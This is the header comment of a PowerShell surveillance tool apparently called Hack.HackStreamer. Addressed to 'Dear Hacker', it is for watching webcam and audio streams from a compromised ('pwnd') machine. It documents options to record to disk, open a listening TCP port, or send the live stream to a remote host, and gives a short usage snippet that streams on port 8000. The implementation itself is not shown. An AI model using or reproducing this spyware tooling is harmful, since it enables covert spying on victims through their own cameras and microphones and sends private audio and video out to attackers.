<#
Dear Hacker, if you ever wanted to watch a webcam + audio stream from a pwnd machine, now everything is in your hands.
With great power comes great responsibility.

__Constructors
() -> with default devices
(videoDev, audioDev) -> with provided devices, may be obtained from static GetVideoDevices or GetAudioDevices

__Init(config)
may contain such options:
cap[string]: path of where to write the captured file to
share[int]: open a local port for tcp incoming connection
send[string]: should look like [udp://]<ip>:<port>, tcp:// is by default, no need to write it
		     connects to a remote host and sends the stream there
shitty[whatever]: if you for some reason need shitty quality of the recording
                    this will produce a very small sized file, ex 81kb per 5 secs

__Usage
$streamer = new-object Hack.HackStreamer
$streamer.Init(@{share=8000})
$streamer.Start()

__Bugs
Even if you don't want to capture to a file on the harddisk, it will still leave a 0 sized file there in .\
This is an artifact of asfWriter Filter, and I haven't found a solution for avoiding it.

H4ppY h@ck1n9! 
